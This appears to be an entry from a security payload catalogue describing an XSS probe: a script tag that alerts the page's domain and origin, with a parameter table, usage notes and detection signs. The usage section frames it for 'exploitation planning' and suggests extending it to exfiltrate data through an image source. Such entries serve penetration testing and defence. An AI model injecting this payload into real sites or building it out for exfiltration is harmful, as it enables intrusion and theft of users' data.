---
id: 5c958dbb-b049-40e4-8880-93877ac29709
name: html-script-alert-domain-origin
type: code
language: html
verified: true
created_at: '2023-04-06T03:56:41.759045+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - context
validated: true
---

# html-script-alert-domain-origin

## Code

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

## Description

HTML payload that alerts the document domain and window origin concatenated with newlines, verifying full context access for exploitation planning.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| document.domain | Current domain | 'example.com' |
| window.origin | Full origin | 'https://example.com' |

## Usage

Inject into vulnerable endpoints to confirm execution scope. Output helps determine if cross-origin restrictions apply; extend to exfiltrate via image src.

## Detection

- Alerts with domain info in user reports.
- Console monitoring for concat operations.
- CSP blocking inline script execution.

## Related

- [[procedures/Identify-and-Exploit-XSS-Vulnerabilities]]
